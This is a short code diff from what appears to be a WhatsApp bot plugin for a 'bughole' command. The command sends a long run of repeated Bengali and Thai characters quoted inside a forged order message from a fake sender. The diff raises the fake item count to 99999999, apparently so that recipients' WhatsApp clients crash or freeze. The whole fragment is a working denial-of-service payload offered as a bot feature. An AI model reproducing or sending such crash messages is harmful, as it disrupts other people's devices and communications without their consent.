@@ -3139,7 +3139,7 @@ let info = `
 *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
 `.trim()
 
-const xixi = { key : { participant : '0@s.whatsapp.net' }, message: { orderMessage: { itemCount : 1, status: 1, surface : 1, message: "Bug Hole By Ariffb", orderTitle: "Bug Hole", thumbnail: fs.readFileSync("./src/logo.jpg"), sellerJid: '0@s.whatsapp.net' }}}
+const xixi = { key : { participant : '0@s.whatsapp.net' }, message: { orderMessage: { itemCount : 99999999, status: 1, surface : 1, message: "Bug Hole By Ariffb", orderTitle: "Bug Hole", thumbnail: fs.readFileSync("./src/logo.jpg"), sellerJid: '0@s.whatsapp.net' }}}
 conn.sendMessage(m.chat, info, MessageType.extendedText, { quoted: xixi })
 }
 handler.help = ['bughole']
